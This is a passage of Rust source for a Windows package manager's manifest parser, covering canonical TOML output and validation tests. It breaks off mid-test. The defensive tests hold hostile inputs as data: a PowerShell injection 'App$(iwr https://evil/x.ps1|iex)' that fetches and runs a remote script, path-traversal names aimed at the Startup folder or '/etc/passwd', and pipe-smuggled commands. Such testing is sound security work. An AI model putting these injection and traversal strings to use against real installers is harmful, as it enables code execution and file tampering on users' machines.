pub(crate) fn safe_windows_component(value: &str) -> bool {
    if value.contains(':') || value.ends_with(['.', ' ']) {
        return false;
    }
    let stem = value
        .split('.')
        .next()
        .unwrap_or(value)
        .to_ascii_uppercase();
    !matches!(stem.as_str(), "CON" | "PRN" | "AUX" | "NUL")
        && !matches!(
            stem.as_bytes(),
            [b'C', b'O', b'M', b'1'..=b'9'] | [b'L', b'P', b'T', b'1'..=b'9']
        )
}

// --- canonical TOML emission ---------------------------------------------

/// A TOML basic string. Basic (not literal) everywhere, because that is what the
/// ~2,800 published manifests use — `bin = ["bin\\rg.exe"]`, never `'bin\rg.exe'`.
fn esc(s: &str) -> String {
    let mut o = String::with_capacity(s.len() + 2);
    o.push('"');
    for c in s.chars() {
        match c {
            '"' => o.push_str("\\\""),
            '\\' => o.push_str("\\\\"),
            '\n' => o.push_str("\\n"),
            '\r' => o.push_str("\\r"),
            '\t' => o.push_str("\\t"),
            // TOML forbids raw control characters and DEL inside a basic string.
            c if c.is_control() => o.push_str(&format!("\\u{:04X}", c as u32)),
            c => o.push(c),
        }
    }
    o.push('"');
    o
}

/// A bare key when TOML allows one, otherwise a quoted key.
fn bare_or_quoted_key(k: &str) -> String {
    if !k.is_empty()
        && k.chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
    {
        k.to_string()
    } else {
        esc(k)
    }
}

/// One line, however long. `coreutils` has a 4.6 KB `bin` array on one line and
/// wrapping it would rewrite every array in the registry.
fn inline_array<T>(items: &[T], render: impl Fn(&T) -> String) -> String {
    format!(
        "[{}]",
        items.iter().map(render).collect::<Vec<_>>().join(", ")
    )
}

fn inline_table(pairs: &[(&str, String)]) -> String {
    if pairs.is_empty() {
        return "{}".to_string();
    }
    let body: Vec<String> = pairs
        .iter()
        .map(|(k, v)| format!("{} = {v}", bare_or_quoted_key(k)))
        .collect();
    format!("{{ {} }}", body.join(", "))
}

fn bin_value(b: &Bin) -> String {
    match b {
        Bin::Path(p) => esc(p),
        Bin::Table { name, path, args } => {
            let mut pairs = vec![("name", esc(name)), ("path", esc(path))];
            if let Some(a) = args {
                pairs.push(("args", esc(a)));
            }
            inline_table(&pairs)
        }
    }
}

fn shortcut_value(s: &Shortcut) -> String {
    match s {
        Shortcut::Path(p) => esc(p),
        Shortcut::Table { target, name } => {
            inline_table(&[("target", esc(target)), ("name", esc(name))])
        }
    }
}

/// Canonical key order inside the opaque `[autoupdate]` value. One flat list at
/// every depth: the whole vocabulary is `checkver`/`url_template` and their few
/// members, and no name repeats at two depths. Anything unlisted follows in the
/// map's own (sorted) order.
///
/// A fixed list, not the map order, is the point: `checkver = { url = …, regex =
/// … }` is how 323 published manifests read, and alphabetical would rewrite all
/// of them (plus the 435 with `{ x64, arm64 }`).
const AUTOUPDATE_KEY_ORDER: &[&str] = &[
    "checkver",
    "url_template",
    "github",
    "vendor",
    "url",
    "regex",
    "x64",
    "arm64",
];

fn ordered_pairs(table: &toml::Table) -> Vec<(&str, &toml::Value)> {
    let mut pairs: Vec<(&str, &toml::Value)> = table.iter().map(|(k, v)| (k.as_str(), v)).collect();
    // Stable, so unlisted keys keep the map's order relative to each other.
    pairs.sort_by_key(|(k, _)| {
        AUTOUPDATE_KEY_ORDER
            .iter()
            .position(|known| known == k)
            .unwrap_or(usize::MAX)
    });
    pairs
}

/// Render an opaque `toml::Value` inline — tables included, never as a section.
fn inline_value(v: &toml::Value) -> String {
    match v {
        toml::Value::String(s) => esc(s),
        toml::Value::Integer(i) => i.to_string(),
        toml::Value::Float(f) => float_value(*f),
        toml::Value::Boolean(b) => b.to_string(),
        toml::Value::Datetime(d) => d.to_string(),
        toml::Value::Array(a) => inline_array(a, inline_value),
        toml::Value::Table(t) => {
            let pairs: Vec<(&str, String)> = ordered_pairs(t)
                .into_iter()
                .map(|(k, v)| (k, inline_value(v)))
                .collect();
            inline_table(&pairs)
        }
    }
}

/// A TOML float always carries a fractional part or an exponent, so `1.0` must
/// not come back out as `1` (that re-parses as an integer).
fn float_value(f: f64) -> String {
    if f.is_nan() {
        return if f.is_sign_negative() { "-nan" } else { "nan" }.to_string();
    }
    if f.is_infinite() {
        return if f.is_sign_negative() { "-inf" } else { "inf" }.to_string();
    }
    let s = f.to_string();
    if s.contains(['.', 'e', 'E']) {
        s
    } else {
        format!("{s}.0")
    }
}

/// Env values may contain literal text and the single template var `{dir}`.
/// Any other `{...}` placeholder is rejected.
fn check_env_template(key: &str, val: &str) -> Result<(), ManifestError> {
    let mut rest = val;
    while let Some(open) = rest.find('{') {
        let after = &rest[open + 1..];
        let close = after.find('}').ok_or_else(|| ManifestError::EnvTemplate {
            key: key.to_string(),
        })?;
        let placeholder = &after[..close];
        if placeholder != "dir" {
            return Err(ManifestError::EnvTemplate {
                key: key.to_string(),
            });
        }
        rest = &after[close + 1..];
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    const FULL: &str = r#"
name = "ripgrep"
version = "14.1.1"
description = "Recursively search directories with a regex"
homepage = "https://github.com/BurntSushi/ripgrep"
icon = "https://example.com/ripgrep.svg"
license = "MIT OR Unlicense"
kind = "app"
extract_dir = "ripgrep-14.1.1-x86_64-pc-windows-msvc"
bin = ["rg.exe", { name = "t2", path = "sub/tool2.exe", args = "--flag" }]
persist = ["config", "data"]
gui = false

[source.x64]
url = "https://example.com/rg-x64.zip"
sha256 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
[source.arm64]
url = "https://example.com/rg-arm64.zip"
sha256 = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"

[env]
JAVA_HOME = "{dir}"
PATH = "{dir}\\bin"

[depends]
vcredist = "*"

[autoupdate]
checkver = { github = "BurntSushi/ripgrep" }
"#;

    #[test]
    fn full_manifest_parses() {
        let m = Manifest::from_toml_str(FULL).expect("should parse");
        assert_eq!(m.name, "ripgrep");
        assert_eq!(m.version, "14.1.1");
        assert_eq!(m.icon.as_deref(), Some("https://example.com/ripgrep.svg"));
        assert_eq!(m.kind, Kind::App);
        assert!(m.source.x64.is_some());
        assert!(m.source.arm64.is_some());
        assert_eq!(m.bin.len(), 2);
        assert_eq!(m.bin[0], Bin::Path("rg.exe".to_string()));
        assert_eq!(m.bin[1].path(), "sub/tool2.exe");
        assert_eq!(m.env.get("JAVA_HOME").unwrap(), "{dir}");
        assert_eq!(m.persist, vec!["config", "data"]);
        assert_eq!(m.gui, Some(false));
    }

    #[test]
    fn testdata_ripgrep_parses() {
        let s = include_str!("../testdata/ripgrep.toml");
        Manifest::from_toml_str(s).expect("testdata manifest should parse");
    }

    /// Real manifests copied verbatim out of the published registry, one per
    /// shape the canonical form has to reproduce. These are the test that kills
    /// the conflict class: if `to_canonical_toml` ever drifts from what is on
    /// disk, every bumped file in that shape becomes a merge conflict.
    const REAL: &[&str] = &[
        // dual-arch, extract_dir, github checkver, url_template { x64, arm64 }
        include_str!("../testdata/canonical/ripgrep-15.2.0.toml"),
        // sha512 instead of sha256, dual-arch
        include_str!("../testdata/canonical/caddy-2.11.4.toml"),
        // single-arch, gui, shortcuts, checkver { url, regex } with escapes
        include_str!("../testdata/canonical/everything-1.4.1.1032.toml"),
        // persist, gui, bin table form, a `#/dl.zip` rename fragment
        include_str!("../testdata/canonical/vscode-1.131.0.toml"),
        // kind = "installer-archive", nested shortcut name, opaque checkver string
        include_str!("../testdata/canonical/adventuregamestudio-3.6.2.20.toml"),
        // icon, [env], checkver { vendor }, no url_template
        include_str!("../testdata/canonical/googlechrome-151.0.7922.72.toml"),
        // [depends]
        include_str!("../testdata/canonical/ani-cli-4.15.toml"),
        // [env], url_template as a bare string, backslash bin path
        include_str!("../testdata/canonical/allure-2.44.0.toml"),
        // several backslash bins and several table shortcuts on one line
        include_str!("../testdata/canonical/amule-3.0.1.toml"),
        // bin/shortcut names needing no quoting gymnastics ("notepad++")
        include_str!("../testdata/canonical/notepadplusplus-8.9.7.toml"),
        // kind = "skill": [source.any], no app fields, no [autoupdate]
        include_str!("../testdata/canonical/skill-improve-codebase-architecture-2026.7.29.toml"),
    ];

    /// THE property: parse a published manifest, re-serialize, and get the same
    /// bytes back. Line endings are normalized first — the registry stores LF and
    /// a Windows checkout has CRLF in the working tree; that is git's choice, and
    /// every other byte is ours.
    #[test]
    fn canonical_toml_is_byte_identical_to_published_manifests() {
        for (i, text) in REAL.iter().enumerate() {
            let want = text.replace("\r\n", "\n");
            let m = Manifest::from_toml_str(&want)
                .unwrap_or_else(|e| panic!("fixture #{i} must parse: {e}"));
            let label = format!("{} {}", m.name, m.version);
            let got = m.to_canonical_toml();
            assert_eq!(
                got, want,
                "{label}: canonical output differs from the published file\n\
                 --- got ---\n{got}\n--- want ---\n{want}\n"
            );
            assert!(m.is_canonical_toml(text), "{label}: is_canonical_toml");
        }
    }

    /// Two published manifests carry whole-line comments, and those comments are
    /// load-bearing — `p/python` says `[autoupdate]` was removed on purpose so CI
    /// can never add a version. A `Manifest` has nowhere to keep a comment, so the
    /// canonical text cannot reproduce one; the format check must tolerate them
    /// rather than tell a maintainer to delete the warning.
    ///
    /// `j/jq` is also the registry's only `kind = "binary"` package, so this pins
    /// `file_name` + a per-arch `kind = "binary"` against a real file.
    #[test]
    fn comments_are_not_format_drift() {
        for (label, text) in [
            ("jq", include_str!("../testdata/canonical/jq-1.8.2.toml")),
            (
                "python",
                include_str!("../testdata/canonical/python-3.14.6.toml"),
            ),
        ] {
            let text = text.replace("\r\n", "\n");
            let m = Manifest::from_toml_str(&text).unwrap();
            assert!(text.contains('#'), "{label}: fixture must have a comment");
            assert!(
                m.is_canonical_toml(&text),
                "{label}: a comment is not drift\n{}",
                m.to_canonical_toml()
            );
            // Everything except the comment lines is byte-identical.
            let without_comments: String = text
                .lines()
                .filter(|l| !l.trim_start().starts_with('#'))
                .map(|l| format!("{l}\n"))
                .collect();
            assert_eq!(without_comments, m.to_canonical_toml(), "{label}");
        }

        let jq =
            Manifest::from_toml_str(include_str!("../testdata/canonical/jq-1.8.2.toml")).unwrap();
        assert_eq!(jq.file_name.as_deref(), Some("jq.exe"));
        let x64 = jq.source.x64.as_ref().unwrap();
        assert_eq!(x64.kind, SourceKind::Binary);
        assert_eq!(jq.binary_file_name(x64), "jq.exe");
    }

    /// The other half: serialize → re-parse → equal `Manifest`. Byte-identity
    /// alone would be satisfied by a serializer that drops a field the fixtures
    /// happen not to use.
    #[test]
    fn aliases_are_validated_like_real_names() {
        let base = |extra: &str| {
            format!(
                "name = \"pkg\"
version = \"1.0.0\"
kind = \"app\"
{extra}
                 [source.x64]
url = \"https://e.com/a.zip\"
sha256 = \"{}\"
",
                "a".repeat(64)
            )
        };
        // An alias is a name users type, so it obeys the package-name charset.
        for bad in ["\"UPPER\"", "\"has space\"", "\"under_score\"", "\"\""] {
            let toml = base(&format!("aliases = [{bad}]"));
            assert!(
                Manifest::from_toml_str(&toml).is_err(),
                "{bad} should be rejected"
            );
        }
        // Aliasing yourself would make the name ambiguous with itself.
        assert!(Manifest::from_toml_str(&base("aliases = [\"pkg\"]")).is_err());
        // The same alias twice is a copy-paste slip, not an intent.
        assert!(Manifest::from_toml_str(&base("aliases = [\"a\", \"a\"]")).is_err());
        // Two different former names are fine.
        let m = Manifest::from_toml_str(&base("aliases = [\"old\", \"older\"]")).unwrap();
        assert_eq!(m.aliases, vec!["old", "older"]);
        // Absent is the norm and stays empty.
        assert!(
            Manifest::from_toml_str(&base(""))
                .unwrap()
                .aliases
                .is_empty()
        );
    }

    #[test]
    fn canonical_toml_round_trips_every_field() {
        let mut cases: Vec<Manifest> = REAL
            .iter()
            .map(|t| Manifest::from_toml_str(&t.replace("\r\n", "\n")).unwrap())
            .collect();
        cases.push(Manifest::from_toml_str(FULL).unwrap());
        // Every field at once, including the ones no published manifest uses yet:
        // write_file, source.extra, and a binary source with file_name.
        cases.push(
            Manifest::from_toml_str(&binary(
                r#"file_name = "jq.exe"
bin = ["jq.exe", { name = "jaq", path = "jq.exe", args = "--args" }]
shortcuts = ["jq.exe", { target = "jq.exe", name = "Vendor\\JQ" }]
persist = ["config", "res/conf"]
write_file = [{ path = "portable.ini", content = "[settings]\nportable = true\t\"q\"" }]
gui = false

[env]
JQ_HOME = "{dir}"
"weird key" = "{dir}\\bin"

[depends]
vcredist = "*""#,
                "https://example.com/d/jq-windows-amd64.exe",
            ))
            .expect("the everything-at-once binary manifest must be valid"),
        );
        cases.push(
            Manifest::from_toml_str(&format!(
                r#"
name = "app"
version = "1.0.0"
kind = "app"

[source.x64]
url = "https://example.com/a.zip"
sha256 = "{}"
extra = [{{ url = "https://example.com/b.zip", sha256 = "{}", extract_to = "plugins" }}]

[autoupdate]
url_template = {{ x64 = "https://example.com/$version.zip" }}
checkver = {{ regex = "v([\\d.]+)", url = "https://example.com/" }}
"#,
                "a".repeat(64),
                "b".repeat(64)
            ))
            .expect("extra sources and a reordered autoupdate must be valid"),
        );

        for m in &cases {
            let text = m.to_canonical_toml();
            let back = Manifest::from_toml_str(&text)
                .unwrap_or_else(|e| panic!("re-parse of {}: {e}\n{text}", m.name));
            assert_eq!(*m, back, "{} did not round-trip\n{text}", m.name);
            // Idempotent: normalizing an already-canonical file is a no-op.
            assert_eq!(text, back.to_canonical_toml(), "{} is not stable", m.name);
        }
    }

    /// `checkver = { url = …, regex = … }` is how 323 published manifests read
    /// and `{ x64, arm64 }` how 435 do. Emitting map order (alphabetical) would
    /// rewrite all of them, so the key order is fixed by the serializer and does
    /// not depend on the input's.
    #[test]
    fn autoupdate_key_order_is_fixed_not_alphabetical() {
        let m = Manifest::from_toml_str(&format!(
            r#"
name = "app"
version = "1.0.0"
kind = "app"

[source.x64]
url = "https://example.com/a.zip"
sha256 = "{}"

[autoupdate]
url_template = {{ arm64 = "https://example.com/arm64", x64 = "https://example.com/x64" }}
checkver = {{ regex = "v([\\d.]+)", url = "https://example.com/" }}
"#,
            "c".repeat(64)
        ))
        .unwrap();
        let text = m.to_canonical_toml();
        assert!(
            text.ends_with(
                "[autoupdate]\n\
                 checkver = { url = \"https://example.com/\", regex = \"v([\\\\d.]+)\" }\n\
                 url_template = { x64 = \"https://example.com/x64\", arm64 = \"https://example.com/arm64\" }\n"
            ),
            "unexpected autoupdate rendering:\n{text}"
        );
    }

    /// The rule the compact form exists to protect: TOML absorbs a scalar that
    /// follows a `[table]` header into that table. `gui`, `file_name` and
    /// `write_file` are the newest top-level fields and the easiest to misplace.
    #[test]
    fn every_top_level_scalar_precedes_the_first_table_header() {
        let m = Manifest::from_toml_str(&binary(
            r#"file_name = "jq.exe"
gui = true
write_file = [{ path = "portable.ini", content = "x" }]"#,
            "https://example.com/d/jq.exe",
        ))
        .unwrap();
        let text = m.to_canonical_toml();
        let first_header = text.find("\n[").expect("there is always a [source] table");
        for field in ["file_name", "gui", "write_file"] {
            let at = text
                .find(&format!("\n{field} = "))
                .or_else(|| text.starts_with(&format!("{field} = ")).then_some(0))
                .unwrap_or_else(|| panic!("{field} missing from:\n{text}"));
            assert!(
                at < first_header,
                "{field} emitted after a table header:\n{text}"
            );
        }
        assert!(text.contains("kind = \"binary\"\n"), "{text}");
    }

    /// Empty is absent. Bump used to emit `persist = []`, `[env]`, `[depends]`
    /// and `extra = []`; the importer omitted them, and the two forms parse to
    /// the same manifest — that difference alone was 20 conflicted files.
    #[test]
    fn empty_collections_and_tables_are_omitted() {
        let text = Manifest::from_toml_str(&minimal(""))
            .unwrap()
            .to_canonical_toml();
        for absent in [
            "persist = []",
            "shortcuts = []",
            "write_file = []",
            "bin = []",
            "extra = []",
            "[env]",
            "[depends]",
            "[autoupdate]",
            "kind = \"archive\"",
        ] {
            assert!(
                !text.contains(absent),
                "{absent:?} should be omitted:\n{text}"
            );
        }
        assert_eq!(
            text,
            format!(
                "name = \"app\"\nversion = \"1.0.0\"\nkind = \"app\"\n\n\
                 [source.x64]\nurl = \"https://example.com/a.zip\"\nsha256 = \"{}\"\n",
                "c".repeat(64)
            )
        );
    }

    fn minimal(extra: &str) -> String {
        format!(
            r#"
name = "app"
version = "1.0.0"
kind = "app"
{extra}

[source.x64]
url = "https://example.com/a.zip"
sha256 = "{hash}"
"#,
            hash = "c".repeat(64),
            extra = extra,
        )
    }

    #[test]
    fn source_kind_defaults_and_parses_installer_archive() {
        let regular = Manifest::from_toml_str(&minimal("")).unwrap();
        assert_eq!(
            regular.source.x64.as_ref().unwrap().kind,
            SourceKind::Archive
        );
        assert!(
            !toml::to_string(&regular)
                .unwrap()
                .contains("kind = \"archive\"")
        );

        let installer = Manifest::from_toml_str(&minimal(
            "[source.arm64]\nurl = \"https://example.com/setup.exe\"\nsha256 = \"dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd\"\nkind = \"installer-archive\"",
        ))
        .unwrap();
        assert_eq!(
            installer.source.arm64.as_ref().unwrap().kind,
            SourceKind::InstallerArchive
        );
        assert!(
            toml::to_string(&installer)
                .unwrap()
                .contains("kind = \"installer-archive\"")
        );
    }

    /// A bare-binary source: `jq`, `yt-dlp` and the ~178 other Scoop packages
    /// that ship one `.exe` with no archive around it.
    fn binary(extra: &str, url: &str) -> String {
        format!(
            r#"
name = "app"
version = "1.0.0"
kind = "app"
{extra}

[source.x64]
url = "{url}"
sha256 = "{hash}"
kind = "binary"
"#,
            hash = "c".repeat(64),
        )
    }

    #[test]
    fn binary_source_names_the_file_from_file_name_or_the_url() {
        let jq = Manifest::from_toml_str(&binary(
            r#"file_name = "jq.exe"
bin = ["jq.exe"]"#,
            "https://example.com/download/jq-windows-amd64.exe",
        ))
        .expect("a binary source should parse");
        let source = jq.source.x64.as_ref().unwrap();
        assert_eq!(source.kind, SourceKind::Binary);
        // The name users want on PATH wins over the URL's.
        assert_eq!(jq.binary_file_name(source), "jq.exe");
        assert_eq!(jq.bin[0].shim_name(), "jq");
        assert!(toml::to_string(&jq).unwrap().contains("kind = \"binary\""));

        // No file_name: the URL's last path segment, with any query string or
        // fragment dropped, and `#/name.ext` honoured (the fetch-cache rename
        // convention that published manifests already use).
        for (url, want) in [
            ("https://example.com/d/yt-dlp.exe", "yt-dlp.exe"),
            ("https://example.com/d/yt-dlp.exe?token=1", "yt-dlp.exe"),
            ("https://example.com/d/download#/yt-dlp.exe", "yt-dlp.exe"),
            ("https://example.com/d/yt-dlp.exe#fragment", "yt-dlp.exe"),
        ] {
            let m = Manifest::from_toml_str(&binary("", url))
                .unwrap_or_else(|e| panic!("url {url:?} must stay valid: {e}"));
            assert_eq!(
                m.binary_file_name(m.source.x64.as_ref().unwrap()),
                want,
                "file name for {url:?}"
            );
        }
    }

    /// The chosen name is written verbatim into the version dir, and a registry
    /// PR is free to carry a hostile URL — so it gets the same single-component
    /// check as the version dir itself, from BOTH sources it can come from.
    #[test]
    fn rejects_hostile_binary_file_name() {
        for name in [
            "../evil.exe",
            r"..\evil.exe",
            r"C:\evil.exe",
            "sub/jq.exe",
            "CON",
            "lpt9.exe",
            "jq.exe.",
            "jq.exe ",
            "jq|calc.exe",
            "",
        ] {
            let s = binary(
                &format!(r#"file_name = "{}""#, name.escape_default()),
                "https://example.com/d/jq.exe",
            );
            assert!(
                matches!(
                    Manifest::from_toml_str(&s),
                    Err(ManifestError::Component {
                        field: "source file name",
                        ..
                    })
                ),
                "file_name {name:?} should be rejected"
            );
        }
        // Same gate for a name that arrives through the URL instead.
        for url in [
            "https://example.com/d/download#/..",
            "https://example.com/d/download#/C:evil.exe",
            "https://example.com/d/download#/CON",
            "https://example.com/d/",
        ] {
            assert!(
                Manifest::from_toml_str(&binary("", url)).is_err(),
                "url {url:?} should be rejected"
            );
        }
    }

    /// Nothing is extracted, so a wrapper dir to strip is a manifest bug —
    /// reported, not ignored. And `file_name` names a downloaded file, so it is
    /// meaningless (and misleading) on an archive.
    #[test]
    fn extract_dir_and_file_name_are_rejected_on_the_wrong_source_kind() {
        assert!(matches!(
            Manifest::from_toml_str(&binary(
                r#"extract_dir = "wrapper""#,
                "https://example.com/d/jq.exe"
            )),
            Err(ManifestError::BinaryField("extract_dir"))
        ));
        assert!(matches!(
            Manifest::from_toml_str(&minimal(r#"file_name = "jq.exe""#)),
            Err(ManifestError::FileNameWithoutBinary)
        ));
    }

    #[test]
    fn rejects_short_sha256() {
        let s = r#"
name = "app"
version = "1.0.0"
kind = "app"
[source.x64]
url = "https://example.com/a.zip"
sha256 = "abc123"
"#;
        assert!(matches!(
            Manifest::from_toml_str(s),
            Err(ManifestError::BadHash { .. })
        ));
    }

    #[test]
    fn rejects_non_https_icon() {
        let s = minimal(r#"icon = "http://example.com/app.png""#);
        assert!(matches!(
            Manifest::from_toml_str(&s),
            Err(ManifestError::IconUrl(_))
        ));
    }

    #[test]
    fn rejects_non_hex_sha256() {
        let s = format!(
            r#"
name = "app"
version = "1.0.0"
kind = "app"
[source.x64]
url = "https://example.com/a.zip"
sha256 = "{}"
"#,
            "z".repeat(64)
        );
        assert!(matches!(
            Manifest::from_toml_str(&s),
            Err(ManifestError::BadHash { .. })
        ));
    }

    #[test]
    fn rejects_absolute_bin_path() {
        let s = minimal(r#"bin = ["C:\\windows\\rg.exe"]"#);
        assert!(matches!(
            Manifest::from_toml_str(&s),
            Err(ManifestError::RelativePath { .. })
        ));
    }

    #[test]
    fn rejects_unix_absolute_bin_path() {
        let s = minimal(r#"bin = ["/usr/bin/rg"]"#);
        assert!(matches!(
            Manifest::from_toml_str(&s),
            Err(ManifestError::RelativePath { .. })
        ));
    }

    #[test]
    fn rejects_parent_dir_bin_path() {
        let s = minimal(r#"bin = ["../escape.exe"]"#);
        assert!(matches!(
            Manifest::from_toml_str(&s),
            Err(ManifestError::RelativePath { .. })
        ));
    }

    /// `bin.name` is used verbatim as `shims\<name>.exe` — which sits beside
    /// voli's own binaries. Only the PATH used to be checked, never the name.
    #[test]
    fn rejects_bin_name_that_escapes_the_shims_dir() {
        for name in ["../bin/voli", r"..\bin\voli", "sub/rg", r"C:\bin\voli", ""] {
            let s = minimal(&format!(
                r#"bin = [{{ name = "{}", path = "rg.exe" }}]"#,
                name.escape_default()
            ));
            assert!(
                matches!(
                    Manifest::from_toml_str(&s),
                    Err(ManifestError::Component {
                        field: "bin name",
                        ..
                    })
                ),
                "bin name {name:?} should be rejected"
            );
        }
        Manifest::from_toml_str(&minimal(r#"bin = [{ name = "rg", path = "sub/rg.exe" }]"#))
            .expect("a plain shim name stays valid");
    }

    /// `shortcut.name` reached a PowerShell double-quoted string at install
    /// time (`$(...)` evaluates) and `link_dir.join("{name}.lnk")` (traversal
    /// into the real Startup folder). Neither was validated at all.
    #[test]
    fn rejects_shortcut_name_injection_and_traversal() {
        for name in [
            "App$(iwr https://evil/x.ps1|iex)",
            // `$` and a backtick are the two characters PowerShell expands in a
            // double-quoted string. Rejected on their own, so validation still
            // refuses injection even if `create_shortcut` ever went back to
            // interpolating instead of passing values through the environment.
            "App$x",
            "App`x",
            "../Startup/x",
            r"..\Startup\x",
            "App|calc",
            "App?",
        ] {
            let s = minimal(&format!(
                r#"shortcuts = [{{ target = "rg.exe", name = "{}" }}]"#,
                name.escape_default()
            ));
            assert!(
                Manifest::from_toml_str(&s).is_err(),
                "shortcut name {name:?} should be rejected"
            );
        }
        // A shortcut name MAY nest: `Vendor\App` is a Start Menu subfolder, and
        // ~5 published packages rely on it. Parentheses and `!` are common in
        // real display names and are inert without `$`.
        for name in [
            "My App (x64)",
            r"Adventure Game Studio\AGS Editor",
            "PeerBanHelper/PeerBanHelper (GUI)",
            "Qalculate! (GTK)",
        ] {
            let s = minimal(&format!(
                r#"shortcuts = [{{ target = "rg.exe", name = "{}" }}]"#,
                name.escape_default()
            ));
            Manifest::from_toml_str(&s)
                .unwrap_or_else(|e| panic!("shortcut name {name:?} must stay valid: {e}"));
        }
    }

    /// `Path::file_stem` treats `\` as a separator only on Windows, so
    /// `bin\stg.exe` gave `stg` locally and `bin\stg` on Linux. Since
    /// voli-index-tool validates the whole registry from Linux CI, 215 published
    /// manifests passed on a maintainer's machine and failed the publish.
    #[test]
    fn shim_and_link_names_do_not_depend_on_the_host_separator() {
        for (path, want) in [
            (r"bin\stg.exe", "stg"),
            ("bin/stg.exe", "stg"),
            (r"IDE\bin\trae.exe", "trae"),
            ("rg.exe", "rg"),
            (r"bin\no-extension", "no-extension"),
        ] {
            let s = minimal(&format!(r#"bin = ["{}"]"#, path.escape_default()));
            let m = Manifest::from_toml_str(&s)
                .unwrap_or_else(|e| panic!("bin {path:?} must stay valid: {e}"));
            assert_eq!(m.bin[0].shim_name(), want, "shim name for {path:?}");
        }
        // The bare-string Shortcut variant derives its display name the same way.
        let m = Manifest::from_toml_str(&minimal(r#"shortcuts = ["bin\\rg.exe"]"#)).unwrap();
        assert_eq!(m.shortcuts[0].link_name(), "rg");
    }

    /// ~20 published packages persist a nested path (`res\conf`,
    /// `AppData\Config`). Containment is the security property, not flatness —
    /// an over-strict rule here failed 25 live manifests and would have broken
    /// the registry publish, which validates before it signs.
    #[test]
    fn persist_may_nest_but_never_escapes() {
        for good in [r"AppData\Config", "res/conf", "data"] {
            let s = minimal(&format!(r#"persist = ["{}"]"#, good.escape_default()));
            Manifest::from_toml_str(&s)
                .unwrap_or_else(|e| panic!("persist {good:?} must stay valid: {e}"));
        }
        for bad in [r"C:\Users\neo\Documents", r"..\..\escape", "/etc/passwd"] {
            let s = minimal(&format!(r#"persist = ["{}"]"#, bad.escape_default()));
            assert!(
                Manifest::from_toml_str(&s).is_err(),
                "persist {bad:?} should be rejected"
            );
        }
    }

    /// `extract_root.join(extract_dir)` then `fs::rename` — an absolute value
    /// makes `join` replace the base and MOVES that directory into the package.
    #[test]
    fn rejects_unvalidated_extract_dir() {
        for dir in [
            r"C:\Users\neo\Documents",
            "/etc",
            "../../elsewhere",
            "sub/C:/x",
            "",
        ] {
            let s = minimal(&format!(r#"extract_dir = "{}""#, dir.escape_default()));
            assert!(
                matches!(
                    Manifest::from_toml_str(&s),
                    Err(ManifestError::RelativePath {
                        field: "extract_dir",
                        ..
                    })
                ),
                "extract_dir {dir:?} should be rejected"
            );
        }
        Manifest::from_toml_str(&minimal(r#"extract_dir = "ripgrep-14.1.1/inner""#))
            .expect("a nested wrapper dir stays valid");
    }

    /// persist entries feed `fs::rename`, `fs::remove_dir_all` and
    /// `junction::create`; the engine has always assumed one flat name.
    #[test]
    fn rejects_unvalidated_persist_entry() {
        // `sub/config` is deliberately NOT here: nested persist paths are used by
        // ~20 published packages. Containment is the property, not flatness.
        for dir in ["../../evil", r"C:\Users\neo\Documents", "..", "cfg|x"] {
            let s = minimal(&format!(r#"persist = ["{}"]"#, dir.escape_default()));
            assert!(
                Manifest::from_toml_str(&s).is_err(),
                "persist {dir:?} should be rejected"
            );
        }
        Manifest::from_toml_str(&minimal(r#"persist = ["config"]"#))
            .expect("a flat persist dir stays valid");
    }

    /// `Paths::version_dir` is `apps\<name>\<version>` — an unchecked version
    /// escapes the voli root entirely.
    #[test]
    fn rejects_version_that_escapes_the_app_dir() {
        for version in [r"..\..\evil", "../../evil", r"C:\evil", "1.0/0", ""] {
            let s = minimal("").replace(
                r#"version = "1.0.0""#,
                &format!(r#"version = "{}""#, version.escape_default()),
            );
            assert!(
                matches!(
                    Manifest::from_toml_str(&s),
                    Err(ManifestError::Component {
                        field: "version",
                        ..
                    })
                ),
                "version {version:?} should be rejected"
            );
        }
        Manifest::from_toml_str(
            &minimal("").replace(r#"version = "1.0.0""#, r#"version = "1.0.0-beta.1+build2""#),
        )
        .expect("an ordinary semver stays valid");
    }

    #[test]
    fn rejects_bad_env_template() {
        let s = minimal("[env]\nFOO = \"{home}/x\"");
        assert!(matches!(
            Manifest::from_toml_str(&s),
            Err(ManifestError::EnvTemplate { .. })
        ));
    }

    #[test]
    fn accepts_dir_env_template() {
        let s = minimal("[env]\nFOO = \"{dir}\\\\bin\"");
        Manifest::from_toml_str(&s).expect("{dir} template should be allowed");
    }

    #[test]
    fn rejects_bad_name() {
        let s = r#"
name = "Rip_Grep"
version = "1.0.0"
kind = "app"
[source.x64]
url = "https://example.com/a.zip"
sha256 = "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
"#;
        assert!(matches!(
            Manifest::from_toml_str(s),
            Err(ManifestError::Name(_))
        ));
    }

    #[test]
    fn rejects_no_source() {
        let s = r#"
name = "app"
version = "1.0.0"
kind = "app"
"#;
        assert!(matches!(
            Manifest::from_toml_str(s),
            Err(ManifestError::NoSource)
        ));
    }

    #[test]
    fn accepts_sha512_instead_of_sha256() {
        let s = format!(
            r#"
name = "app"
version = "1.0.0"
kind = "app"
[source.x64]
url = "https://example.com/a.zip"
sha512 = "{}"
"#,
            "a".repeat(128)
        );
        let m = Manifest::from_toml_str(&s).expect("sha512 should be accepted");
        assert!(m.source.x64.as_ref().unwrap().is_sha512());
        assert_eq!(m.source.x64.as_ref().unwrap().hash(), "a".repeat(128));
    }

    #[test]
    fn rejects_both_sha256_and_sha512() {
        let s = format!(
            r#"
name = "app"
version = "1.0.0"
kind = "app"
[source.x64]
url = "https://example.com/a.zip"
sha256 = "{}"
sha512 = "{}"
"#,
            "a".repeat(64),
            "b".repeat(128)
        );
        assert!(matches!(
            Manifest::from_toml_str(&s),
            Err(ManifestError::HashRequired { .. })
        ));
    }

    #[test]
    fn rejects_neither_sha256_nor_sha512() {
        let s = r#"
name = "app"
version = "1.0.0"
kind = "app"
[source.x64]
url = "https://example.com/a.zip"
"#;
        assert!(matches!(
            Manifest::from_toml_str(s),
            Err(ManifestError::HashRequired { .. })
        ));
    }

    #[test]
    fn parses_shortcuts_both_forms() {
        let s =
